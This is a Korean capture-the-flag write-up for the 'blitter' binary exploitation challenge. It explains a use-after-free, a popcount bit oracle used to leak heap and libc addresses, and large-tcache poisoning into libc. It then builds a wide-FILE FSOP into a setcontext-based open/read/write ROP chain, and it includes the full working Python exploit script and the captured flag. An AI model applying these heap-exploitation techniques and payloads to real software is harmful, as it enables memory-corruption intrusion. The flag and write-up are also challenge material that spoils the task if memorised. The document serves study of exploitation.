# UHCON blitter 풀이

## 실행 환경과 보호 기법

`for_user.zip`에는 `deploy/blitter`, `lib/libc.so.6`, `lib/ld-linux-x86-64.so.2`, 실행 스크립트와 Docker 설정이 들어 있다. `blitter`의 SHA-256은 `59b40064c5f20cb4c4381fb5a6c55c2754b9964414701ab8fec5cef26ae43df0`이다. 제공된 libc는 Ubuntu glibc 2.43이다.

ELF는 x86-64 PIE이고, `GNU_RELRO`와 `BIND_NOW`가 있어 full RELRO이다. 스택 카나리와 NX도 적용되어 있다. `main`은 `0x1120`, 입력을 정확한 바이트 수만큼 읽는 함수는 `0x1c40`, popcount 함수는 `0x1c90`이다. `run.sh`는 `glibc.malloc.tcache_max=4294967296`과 `glibc.cpu.x86_rep_stosb_threshold=2056`을 설정한다. 전자는 이 풀이의 큰 크기 tcache 경로에 중요하다.

`prctl(PR_SET_NO_NEW_PRIVS)`와 seccomp BPF가 활성화된다. 필터는 `read`, `write`, `open`, `openat`, `close`, `lseek`, `fstat`, `newfstatat`, `getdents64`, `brk`, `munmap`, `getrandom`, `rt_sigreturn`, `exit`, `exit_group` 등을 허용한다. `execve`는 허용되지 않으므로 최종 페이로드는 `/flag`를 열어 읽고 표준 출력으로 쓰는 ORW이다.

## 입력 형식

한 프레임은 2바이트 리틀 엔디언 길이와 그 길이만큼의 명령 바이트로 구성된다. 길이는 1~4096이다. 프레임 내부에는 명령을 연달아 넣을 수 있다. 명령 인자는 최대 32비트 unsigned LEB128이다. 정상 처리 후 `ok N`, 오류 시 `fault <code> at +<offset> after <count>`가 출력된다.

| 명령 | 형식 | 동작 |
| --- | --- | --- |
| `a1` | `plane, align_exp, width, height` | `posix_memalign`으로 plane 할당. `plane<20`, `5<=align_exp<=21`, `1<=width<=4096`, `1<=height<=96`, `16<=ceil(width/8)*height<=0xc000` |
| `a2` | `plane` | plane 버퍼 해제 후 설명자 초기화 |
| `a4` | `plane, offset, length, data` | plane 버퍼로 `memcpy` |
| `b1` | `channel, plane` | plane의 포인터와 크기를 channel에 복사. `channel<8` |
| `b2` | `channel` | channel 설명자 초기화 |
| `b3` | `channel, offset, length, data` | channel 버퍼의 각 바이트에 입력을 XOR |
| `c1` | `plane` | 버퍼 전체의 1비트 수를 합산하고 `panel <plane> <count>` 출력 |

전역 channel 테이블은 PIE+`0x4080`에 있으며 항목당 16바이트(`ptr`, `length`)이다. plane 테이블은 PIE+`0x4100`에 있으며 항목당 24바이트(`ptr`, `width`, `height`, `stride`, `length`)이다.

## 취약점과 첫 번째 겹침

`b1`은 포인터를 복사할 뿐 소유권을 추적하지 않는다. 그 뒤 `a2`가 원래 plane을 해제해도 channel은 포인터를 보유한다. 따라서 `b3`으로 해제된 청크의 tcache 메타데이터를 XOR할 수 있다. 반면 `c1`은 살아 있는 plane만 검사하므로, 메타데이터를 읽으려면 두 plane이 같은 청크를 가리키게 만들어야 한다.

작은 할당은 요청 크기 `0x110`(`width=2176,height=1,align_exp=5`)으로 만든다. 실제 청크 크기는 `0x120`이다. 초기 할당의 반환 포인터는 힙 페이지 기준 `p0=+0x360`, `p1=+0x480`, `p2=+0x5a0`, `p5=+0x6c0`이며 32바이트 정렬 청크가 `0x120` 간격으로 놓인다. 이 오프셋은 로컬 ASLR 반복 실행에서 일정했다.

`channel0 -> p1`을 복사하고 p0, p1을 해제한다. tcache head는 p1이고, p1의 safe-linked `next`는 p0이다. `b3(channel0,0,p64(0x360 ^ 0x5a0))`을 적용하면 `next`가 살아 있는 p2로 바뀐다. `a1`을 두 번 더 실행하면 p1과 p2가 차례로 반환된다. 이제 원래 plane2와 새 plane4가 같은 p2를 가리킨다.

plane4를 해제하고 plane2에서 `c1`을 호출하면 해제 청크의 메타데이터를 popcount로 관찰한다. 각 비트를 임시로 XOR한 뒤 다시 복원하며 카운트 차이를 비교하면 64비트 값 전체를 읽을 수 있다. 이 방식으로 `p5 ^ (p2>>12)`를 얻고 safe-linking 변환을 역산하여 힙 주소를 구한다. 해제된 p5의 `next`도 바로잡아 작은 tcache 체인을 정상적으로 비울 수 있게 한다.

## libc 주소 누출

plane5~19와 plane3, 총 16개의 `0x120` 청크를 해제해 해당 tcache bin을 채운다. 이어 겹친 plane4를 해제하면 p2는 unsorted bin으로 들어간다. plane2는 여전히 p2를 가리키므로 같은 popcount 비트 오라클로 `fd`를 읽는다. 제공된 libc에서 이 값은 `libc_base+0x212bd8`이다. 로컬 테스트에서는 계산된 libc 베이스가 페이지 정렬로 검증되었다.

## 큰 tcache 청크를 통한 libc 영역 할당

제공된 glibc 2.43의 `posix_memalign`은 tcache 후보 주소의 `ptr-8`에 있는 크기 필드가 요청 크기 클래스와 정확히 일치하는지 확인한다. 따라서 stdout 주소를 바로 tcache의 `next`로 지정하면 해당 후보가 건너뛰어진다. libc의 쓰기 가능 영역에는 `libc+0x212238`에 자연적으로 `0x8000`이라는 값이 있다. 바로 뒤인 `libc+0x212240`은 32바이트 정렬을 만족하므로 크기 `0x8000`의 가짜 청크 사용자 포인터로 사용할 수 있다.

`width=2944,height=89`는 요청 크기 `0x7ff0`과 실제 청크 크기 `0x8000`을 만든다. 첫 프레임에서 작은 청크 18개와 함께 이 크기의 q0, q1을 할당해 위치를 고정했다. `q0=p2+0x1200`, `q1=q0+0x8000`이다. `channel3`에 q1을 복사하고 q0, q1을 해제하면 큰 tcache 체인이 `q1 -> q0`가 된다. libc 누출 후 channel3으로 q1의 safe-linked `next`를 `q0 ^ (libc+0x212240)`만큼 XOR한다. 다음 큰 할당은 q1, 그다음은 libc 가짜 청크를 반환한다. 이 큰 tcache 동작과 주소 관계는 로컬 및 원격에서 별도 확인했다.

가짜 청크를 plane1로 받은 순간 필수 `memset(0x7ff0)`이 libc 쓰기 가능 상태의 넓은 범위를 지운다. 이 프레임이 끝나며 `ok 4`를 출력하기 전에 `a4`로 실제 `_IO_2_1_stdout_`(`libc+0x213580`)에 사용 가능한 비버퍼링 FILE 객체를 작성하고, 바로 뒤의 `stdout` 전역 포인터(`libc+0x213668`)도 그 주소로 설정한다. 이 객체는 자체 주소를 기준으로 한 short buffer, lock, wide-data 포인터와 정식 `_IO_file_jumps` vtable을 가진다. libc의 `puts` 경로는 정식 `_IO_2_1_stdout_` 객체를 직접 참조하므로 해당 주소를 복구하는 것이 중요하다. 복구 프레임의 `ok 4` 응답을 수신해 이 단계의 생존을 확인한다.

## 종료 시 wide-FILE FSOP

libc 가짜 청크 영역 안에 별도의 fake FILE과 관련 구조를 배치한다.

| 객체 | 주소 |
| --- | --- |
| fake FILE | `target+0x3000` |
| wide_data | `target+0x3200` |
| fake wide vtable | `target+0x3400` |
| read context / write context | `target+0x3600` / `target+0x3800` |
| open ROP / 후속 피벗 | `target+0x3a00` 이후 |
| 파일 경로 / 읽기 버퍼 / lock | `target+0x4000` / `target+0x4200` / `target+0x4400` |

fake FILE의 `_mode`는 1, 정식 vtable은 `_IO_wfile_jumps`(`libc+0x211228`)로 설정한다. wide-data의 write_base는 0, write_ptr은 1, buf_base는 0이다. fake wide vtable의 `doallocate` 슬롯(+`0x68`)에는 `setcontext+61`(`libc+0x4bebd`)을 넣는다. 모든 구조를 작성한 뒤 `_IO_list_all`(`libc+0x213480`)을 fake FILE로 바꾼다. EOF를 보내면 프로그램이 `panel off`를 출력하고 종료 flush를 수행한다. 이때 `_IO_flush_all` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → fake `doallocate` 경로로 제어 흐름이 넘어간다. `_IO_wdoallocbuf`의 간접 호출 시 `rdx`에 fake FILE 포인터가 들어가므로 `setcontext+61`이 이 구조를 context로 읽는다. `setcontext` 시작점의 `rt_sigprocmask` 호출은 seccomp에서 막히기 때문에 해당 syscall을 건너뛰는 `+61` 진입점을 쓴다.

첫 ROP는 `open("/flag", O_RDONLY)`를 실행한다. 이어 두 개의 `setcontext+61` 레코드로 `read(3,buf,0x100)`, `write(1,buf,0x100)`, `exit(0)`를 수행한다. 대상 프로세스의 표준 입력·출력·오류가 fd 0~2를 사용하므로 열린 flag 파일은 fd 3이 된다. 로컬 검증에서는 제공된 `extracted/deploy/flag`를 읽고, 원격에서는 `/flag`를 읽도록 분기했다.

사용한 libc 가젯 오프셋은 `pop rsp; ret` `0x3ca45`, `pop rbp; ret` `0x28a8d`, `pop rdx; leave; ret` `0xa018d`, `pop rax; ret` `0xe5e47`, `pop rdi; ret` `0x11bcfa`, `pop rsi; ret` `0x5c2e7`, `syscall; ret` `0xa0c46`이다. `pop rdx; leave; ret`은 후속 context를 `rdx`로 전달하면서 다음 스택으로 피벗한다. ROP의 syscall은 seccomp에서 허용한 `open`, `read`, `write`, `exit`만 사용한다.

## 재현

```bash
cd pwn/02-blitter

# 제공된 loader와 libc를 사용하는 로컬 실행
python3 -u exploit.py

# 일반 ELF 로딩 경로를 재현한 로컬 실행
python3 make_direct.py
python3 -u exploit.py --direct-local

# 공식 문제 서비스
python3 -u exploit.py --remote 3.36.45.164:11011
```

로컬 실행은 `FLAG{LOCAL_BLITTER_LARGE_FSOP_ORW_OK}`를 출력하고 종료 코드 0으로 끝났다. 공식 서비스에서도 동일한 wide-FILE/ORW 경로로 플래그를 획득했으며, `flag.txt`에 저장했다. 기존 작업 기록에는 문제 제출도 승인되었다고 적혀 있다.

최종 보관 플래그는 다음과 같다.

```text
FLAG{df3c8af1185f2d658e4ef9f6924c1e621582ce7b3d6d90eab8d15e36e6261d56c2ae769294bb27f9e37205a927049d7603f324c9af44065a34192513b5612645203df98727ad5d66}
```

최종 감사에서 당시 대화의 제출 로그를 다시 확인했다. 위 값은 원격에서 두 번 회수된 뒤 CTFd 플래그 입력란에 그대로 제출됐고, 직후 정답 승인과 다음 문제 해금이 기록된 실제 accepted 값이다. `blitter_flag.txt`의 `c5c…` 값은 다른 원격 인스턴스에서 회수된 별도 값으로 보존하되 대표 플래그로 사용하지 않는다.

## 최종 풀이 코드 전체

아래 코드는 최종 산출물의 원문 전체다. `solve.py`는 표준 진입점이고, 실제 exploit 체인은 `exploit.py`에 있다.

### `solve.py`

```python
#!/usr/bin/env python3
"""Standard entry point for the verified blitter exploit.

With no arguments this uses the supplied loader, libc, and local challenge
binary.  A network connection is made only when ``--remote HOST:PORT`` is
passed explicitly; all options are implemented by :mod:`exploit`.
"""

from exploit import main


if __name__ == "__main__":
    main()
```

### `exploit.py`

```python
#!/usr/bin/env python3
"""Offline-first BLT-9000 exploit development harness.

Local mode uses only the supplied ELF, loader and libc. No connection is made
unless --remote is explicitly selected.
"""

import argparse
import os
import re
import select
import socket
import struct
import subprocess
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
LD = ROOT / "extracted/lib/ld-linux-x86-64.so.2"
LIB = ROOT / "extracted/lib"
BIN = ROOT / "extracted/deploy/blitter"


def p64(x):
    return struct.pack("<Q", x & ((1 << 64) - 1))


def leb(n):
    assert 0 <= n < (1 << 32), n
    out = bytearray()
    while n >= 0x80:
        out.append((n & 0x7f) | 0x80)
        n >>= 7
    out.append(n)
    return bytes(out)


def alloc(idx, align=5, width=2176, height=1):
    return b"\xa1" + b"".join(map(leb, (idx, align, width, height)))


def free(idx):
    return b"\xa2" + leb(idx)


def write(idx, off, data):
    return b"\xa4" + leb(idx) + leb(off) + leb(len(data)) + data


def alias(ch, idx):
    return b"\xb1" + leb(ch) + leb(idx)


def clear(ch):
    return b"\xb2" + leb(ch)


def xor(ch, off, data):
    return b"\xb3" + leb(ch) + leb(off) + leb(len(data)) + data


def checksum(idx):
    return b"\xc1" + leb(idx)


def unprotect(value):
    """Invert glibc's PROTECT_PTR for a heap pointer (position is same page)."""
    out = value
    for _ in range(6):
        out = value ^ (out >> 12)
    return out


class Transport:
    def __init__(self, remote=None, direct_local=False):
        self.process = None
        self.sock = None
        self.direct_local = direct_local
        if remote:
            host, port = remote.rsplit(":", 1)
            self.sock = socket.create_connection((host, int(port)), timeout=5)
            self.sock.settimeout(10)
        else:
            env = os.environ.copy()
            env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_max=4294967296:glibc.cpu.x86_rep_stosb_threshold=2056"
            if direct_local:
                env["LD_LIBRARY_PATH"] = str(LIB)
                argv = [str(ROOT / "blitter-direct")]
            else:
                argv = [str(LD), "--library-path", str(LIB), str(BIN)]
            self.process = subprocess.Popen(
                argv,
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                env=env, bufsize=0,
            )
        self.banner = [self.readline(), self.readline()]
        if b"BLT-9000" not in self.banner[0]:
            raise RuntimeError(f"unexpected banner: {self.banner!r}")

    def readexact(self, count):
        out = bytearray()
        while len(out) < count:
            if self.sock:
                chunk = self.sock.recv(count - len(out))
            else:
                if not select.select([self.process.stdout], [], [], 5)[0]:
                    raise TimeoutError(f"local process gave no output after {len(out)} bytes")
                chunk = os.read(self.process.stdout.fileno(), count - len(out))
            if not chunk:
                raise EOFError(f"short read {len(out)}/{count}")
            out.extend(chunk)
        return bytes(out)

    def readline(self):
        out = bytearray()
        while True:
            c = self.readexact(1)
            out.extend(c)
            if c == b"\n":
                return bytes(out)

    def emit(self, *ops):
        packet = b"".join(ops)
        if not 1 <= len(packet) <= 4096:
            raise ValueError(f"invalid frame length {len(packet)}")
        frame = struct.pack("<H", len(packet)) + packet
        if self.sock:
            self.sock.sendall(frame)
        else:
            self.process.stdin.write(frame)
            self.process.stdin.flush()

    def send(self, *ops):
        self.emit(*ops)
        panels = []
        while True:
            line = self.readline().strip()
            if line.startswith(b"panel "):
                m = re.fullmatch(rb"panel (\d+) (\d+)", line)
                if not m:
                    raise RuntimeError(f"unexpected panel line: {line!r}")
                panels.append((int(m[1]), int(m[2])))
            elif line.startswith(b"ok "):
                if int(line[3:]) != len(ops):
                    raise RuntimeError(f"partial execution: {line!r}, expected {len(ops)}")
                return panels
            else:
                raise RuntimeError(f"unexpected response: {line!r}")

    def close(self):
        if self.sock:
            self.sock.close()
        elif self.process:
            if self.process.stdin is not None:
                self.process.stdin.close()
            if self.process.poll() is None:
                self.process.wait(timeout=2)


def bit_oracle(t, plane, channel, offset, bits=64):
    """Read bytes from a freed chunk through popcount and transient XOR flips."""
    baseline = t.send(checksum(plane))[0][1]
    ops = []
    for bit in range(bits):
        mask = bytes((1 << (bit & 7),))
        off = offset + bit // 8
        ops += [xor(channel, off, mask), checksum(plane), xor(channel, off, mask)]
    samples = t.send(*ops)
    assert len(samples) == bits, (len(samples), bits)
    value = 0
    for bit, (idx, count) in enumerate(samples):
        if idx != plane or count not in (baseline - 1, baseline + 1):
            raise RuntimeError(f"invalid oracle sample {bit}: {idx}, {count}; baseline {baseline}")
        if count == baseline - 1:
            value |= 1 << bit
    assert t.send(checksum(plane))[0][1] == baseline
    return value


def stage1(t):
    # Initial fixed page offsets are stable across ASLR under the supplied
    # loader/glibc: p0=+0x360, p1=+0x480, p2=+0x5a0, p5=+0x6c0.
    # 0x110 payloads yield contiguous 0x120 chunks with no alignment slivers.
    large = lambda idx: alloc(idx, width=2944, height=89)
    t.send(alloc(0), alloc(1), alloc(2), *(alloc(i) for i in range(5, 20)), large(3), large(4))
    # Park the large-bin pair in tcache immediately. This fixes their heap
    # positions before any protocol response or checksum printing can cause
    # service-specific allocations; channel3 keeps a UAF handle to q1.
    t.send(alias(3, 4), free(3), free(4), alias(0, 1), free(0), free(1))
    t.send(xor(0, 0, p64(0x360 ^ 0x5a0)))
    t.send(alloc(3), alloc(4))  # p3 == p1; p4 == live p2
    t.send(alias(1, 4), alias(2, 5))
    t.send(free(5), free(4))
    encoded = bit_oracle(t, 2, 1, 0)
    p5 = unprotect(encoded)
    p2 = p5 - 0x120
    if p5 & 0xfff != 0x6c0 or p2 & 0xfff != 0x5a0:
        raise RuntimeError(f"heap layout changed: p5={p5:#x}, p2={p2:#x}")
    print(f"heap p5={p5:#x}, p2={p2:#x}, encoded_fd={encoded:#x}")
    # p5's `next` is zero because it was freed while a bogus tcache head was
    # p2>>12. Change it to PROTECT_PTR(p5, NULL), allowing the bin to drain.
    t.send(xor(2, 0, p64(p5 >> 12)))
    t.send(alloc(4), alloc(5))
    return p2, p5


def stage2(t, p2, p5):
    # Fill all 16 entries of the glibc 2.43 small tcache bin, then free the
    # overlapped chunk. Its unsorted-bin fd/bk now point into main_arena.
    t.send(*(free(i) for i in range(5, 20)), free(3))
    t.send(free(4))
    arena_link = bit_oracle(t, 2, 1, 0)
    libc_base = arena_link - 0x212bd8
    libc_base += int(os.environ.get("BLT_LIBC_DELTA", "0"), 0)
    if libc_base & 0xfff or libc_base < 0x700000000000:
        raise RuntimeError(f"invalid libc base {libc_base:#x} from {arena_link:#x}")
    print(f"libc={libc_base:#x}, main_arena_link={arena_link:#x}")
    return libc_base


FAKE_USER_SIZE = 0x7FF0
FAKE_WIDTH = 2944       # ceil(width / 8) == 368
FAKE_HEIGHT = 89        # 368 * 89 == 0x7ff0; malloc chunk size == 0x8000
FAKE_LIBC_OFF = 0x212240

# All offsets below were checked against the supplied libc build.  Several
# short gadgets intentionally begin inside another instruction.
POP_RSP = 0x3CA45
POP_RAX = 0xE5E47
POP_RDI = 0x11BCFA
POP_RSI = 0x5C2E7
POP_RBP = 0x28A8D
POP_RDX_LEAVE = 0xA018D       # pop rdx ; leave ; ret
SYSCALL_RET = 0xA0C46
SETCONTEXT_61 = 0x4BEBD       # skips forbidden rt_sigprocmask syscall
WFILE_JUMPS = 0x211228
IO_LIST_ALL = 0x213480


def large_alloc(idx):
    return alloc(idx, align=5, width=FAKE_WIDTH, height=FAKE_HEIGHT)


def isolated_stdout_payload(libc, fake):
    """Build an unbuffered FILE at the canonical _IO_2_1_stdout_ address.

    Its pointers refer to backing space inside the controlled libc chunk, so
    the remote stdout object's incidental pre-exploit state is irrelevant.
    """
    out = bytearray(0xE0)
    shortbuf = fake + 0x83
    lock = fake + 0x100
    wide = fake + 0x180
    put64(out, 0x00, 0xFBAD2887)
    for off in (0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38):
        put64(out, off, shortbuf)
    put64(out, 0x40, shortbuf + 1)
    put64(out, 0x68, 0)
    put64(out, 0x70, 1)
    put64(out, 0x78, -1)
    put64(out, 0x80, 0x0A000000)
    put64(out, 0x88, lock)
    put64(out, 0x90, -1)
    put64(out, 0xA0, wide)
    put64(out, 0xC0, 0xFFFFFFFF)
    put64(out, 0xD8, libc + 0x211030)  # _IO_file_jumps
    return bytes(out)


def poison_large_tcache_to_libc(t, p2, libc):
    """Return a live plane whose data pointer is libc+FAKE_LIBC_OFF."""
    target = libc + FAKE_LIBC_OFF

    # stage1 has already allocated q0/q1 before any response-side allocator
    # noise, parked them in the large tcache as q1 -> q0, and retained the UAF
    # channel3 on q1.  Consume that exact parked chain directly.  Reallocating
    # and attempting alias(3, ...) again is invalid because channel3 is live.
    q0 = p2 + 0x1200
    q1 = q0 + 0x8000
    if t.process:
        # Local verification only; exploit logic never consumes these values.
        from pathlib import Path
        maps = Path(f"/proc/{t.process.pid}/maps").read_text().splitlines()
        pie = int(next(
            x.split("-")[0] for x in maps
            if (x.endswith("/deploy/blitter") or x.endswith("/blitter-direct"))
            and " 00000000 " in x
        ), 16)
        with open(f"/proc/{t.process.pid}/mem", "rb", buffering=0) as mem:
            parked = os.pread(mem.fileno(), 16, pie + 0x4080 + 3 * 16)
        parked_q1, parked_len = struct.unpack("<QQ", parked)
        print(f"large parked q0={q0:#x} q1={q1:#x} channel3={parked_q1:#x} target={target:#x}")
        if parked_q1 != q1 or parked_len != FAKE_USER_SIZE:
            raise RuntimeError(
                f"unexpected parked large layout p2={p2:#x} q0={q0:#x} "
                f"q1={q1:#x} channel3=({parked_q1:#x},{parked_len:#x})"
            )
    print(f"large derived q0={q0:#x} q1={q1:#x}")
    t.send(xor(3, 0, p64(q0 ^ target)))

    # First pop returns q1. Second pop accepts the natural 0x8000 header at
    # target-8, then memset(0x7ff0) clears the overlapping libc range.  The
    # final FSOP is entirely libc-relative. Restore a self-contained stdout
    # at the canonical FILE address before this frame prints its response.
    fake_stdout = libc + 0x213580
    blob = isolated_stdout_payload(libc, fake_stdout)
    stdout_delta = fake_stdout - target
    stdout_global_delta = (0x213580 + 0xE8) - FAKE_LIBC_OFF
    t.emit(
        large_alloc(0), large_alloc(1),
        write(1, stdout_delta, blob),
        write(1, stdout_global_delta, p64(fake_stdout)),
    )
    restored = t.readline()
    if restored != b"ok 4\n":
        raise RuntimeError(f"target allocation/stdout restore failed: {restored!r}")
    print(f"target allocation and stdout restore confirmed: {restored!r}")
    return target, 0


def put64(blob, off, value):
    blob[off:off + 8] = p64(value)


def context61(rdi, rsi, rdx, rsp, rip):
    """Minimal structure consumed by setcontext+61 in the supplied libc."""
    out = bytearray(0xB0)
    put64(out, 0x68, rdi)
    put64(out, 0x70, rsi)
    put64(out, 0x88, rdx)
    put64(out, 0xA0, rsp)
    put64(out, 0xA8, rip)
    return bytes(out)


def qwords(*values):
    return b"".join(p64(v) for v in values)


def deploy_fsop_orw(t, libc, target):
    """Build a wide-FILE setcontext chain and trigger it at normal exit."""
    fake = target + 0x3000
    wide = target + 0x3200
    wide_vtable = target + 0x3400
    ctx_read = target + 0x3600
    ctx_write = target + 0x3800
    rop_open = target + 0x3A00
    pivot_read = target + 0x3B00
    after_read = target + 0x3C00
    pivot_write = target + 0x3D00
    write_stack = target + 0x3E00
    flag_path = target + 0x4000
    flag_buf = target + 0x4200
    lock = target + 0x4400

    def la(off):
        return libc + off

    # _IO_flush_all sees mode>0 and wide write_ptr>write_base.  Its legitimate
    # _IO_wfile_jumps overflow calls the attacker-controlled wide vtable's
    # doallocate slot.  wdoallocbuf copies rdi to rdx before the indirect call,
    # so setcontext+61 receives the fake FILE as its context without a gadget.
    file_blob = bytearray(0xE8)
    put64(file_blob, 0x88, lock)
    put64(file_blob, 0xA0, wide)
    put64(file_blob, 0xA8, la(POP_RSP))
    file_blob[0xC0:0xC4] = struct.pack("<I", 1)
    put64(file_blob, 0xD8, la(WFILE_JUMPS))

    wide_blob = bytearray(0xE8)
    put64(wide_blob, 0x00, rop_open)  # consumed by pop rsp
    put64(wide_blob, 0x18, 0)         # wide write_base
    put64(wide_blob, 0x20, 1)         # wide write_ptr; makes flush eligible
    put64(wide_blob, 0x30, 0)         # wide buf_base; enters doallocate
    put64(wide_blob, 0xE0, wide_vtable)

    wide_vtable_blob = bytearray(0x70)
    put64(wide_vtable_blob, 0x68, la(SETCONTEXT_61))

    # open("/flag", O_RDONLY), then pivot through two setcontext+61 records.
    # The challenge process has only fds 0/1/2, so the returned flag fd is 3.
    open_rop = qwords(
        la(POP_RAX), 2,
        la(POP_RDI), flag_path,
        la(POP_RSI), 0,
        la(SYSCALL_RET),
        la(POP_RBP), pivot_read,
        la(POP_RDX_LEAVE), ctx_read,
    )
    # pop rdx;leave;ret transfers to [pivot+8] while setting rdx=context.
    pivot_read_blob = qwords(0, la(SETCONTEXT_61))
    after_read_blob = qwords(
        la(POP_RBP), pivot_write,
        la(POP_RDX_LEAVE), ctx_write,
    )
    pivot_write_blob = qwords(0, la(SETCONTEXT_61))
    write_stack_blob = qwords(
        1, la(SYSCALL_RET),
        la(POP_RDI), 0,
        la(POP_RAX), 60,
        la(SYSCALL_RET),
    )

    read_ctx = context61(3, flag_buf, 0x100, after_read, la(SYSCALL_RET))
    write_ctx = context61(1, flag_buf, 0x100, write_stack, la(POP_RAX))

    pieces = (
        (fake, bytes(file_blob)),
        (wide, bytes(wide_blob)),
        (wide_vtable, bytes(wide_vtable_blob)),
        (ctx_read, read_ctx),
        (ctx_write, write_ctx),
        (rop_open, open_rop),
        (pivot_read, pivot_read_blob),
        (after_read, after_read_blob),
        (pivot_write, pivot_write_blob),
        (write_stack, write_stack_blob),
        (flag_path, (b"extracted/deploy/flag\x00" if t.process else b"/flag\x00")),
        (lock, b"\x00" * 16),
    )
    for address, data in pieces:
        t.send(write(1, address - target, data))

    # Link only after every fake object is fully initialized.  The ordinary
    # Per-frame printf uses the restored canonical stdout object.
    t.send(write(1, (libc + IO_LIST_ALL) - target, p64(fake)))
    print(f"armed _IO_list_all={fake:#x}; closing input to run exit flush")

    if t.process:
        t.process.stdin.close()
        output = bytearray()
        deadline = time.time() + 5
        while time.time() < deadline:
            ready, _, _ = select.select([t.process.stdout, t.process.stderr], [], [], 0.2)
            if not ready and t.process.poll() is not None:
                break
            for stream in ready:
                chunk = os.read(stream.fileno(), 4096)
                if chunk:
                    output.extend(chunk)
        rc = t.process.wait(timeout=2)
        print(f"post-FSOP rc={rc}, output={bytes(output).split(bytes(1), 1)[0]!r}")
        return bytes(output)
    t.sock.shutdown(1)
    output = bytearray()
    while True:
        chunk = t.sock.recv(4096)
        if not chunk:
            break
        output.extend(chunk)
    return bytes(output)



def main():
    parser = argparse.ArgumentParser(description="BLT-9000 wide-FILE ORW exploit")
    parser.add_argument("--remote", metavar="HOST:PORT")
    parser.add_argument("--direct-local", action="store_true")
    args = parser.parse_args()

    t = Transport(args.remote, args.direct_local)
    try:
        p2, p5 = stage1(t)
        libc = stage2(t, p2, p5)
        target, _ = poison_large_tcache_to_libc(t, p2, libc)
        if target & 0x1f:
            raise RuntimeError(f"fake libc chunk is not 0x20 aligned: {target:#x}")
        output = deploy_fsop_orw(t, libc, target)
        match = re.search(rb"[A-Za-z0-9_]+\{[^}\r\n]+\}", output)
        if match is None:
            raise RuntimeError(f"ORW returned no flag: {output!r}")
        flag = match.group(0)
        print(f"FLAG={flag.decode(errors='replace')}")
        if args.remote:
            out = ROOT / "flag.txt"
            out.write_bytes(flag + b"\n")
            print(f"saved {out}")
    except Exception:
        if t.process and t.process.poll() is not None:
            print("local process exit", t.process.returncode, "stderr", t.process.stderr.read())
        raise
    finally:
        t.close()


if __name__ == "__main__":
    main()
```
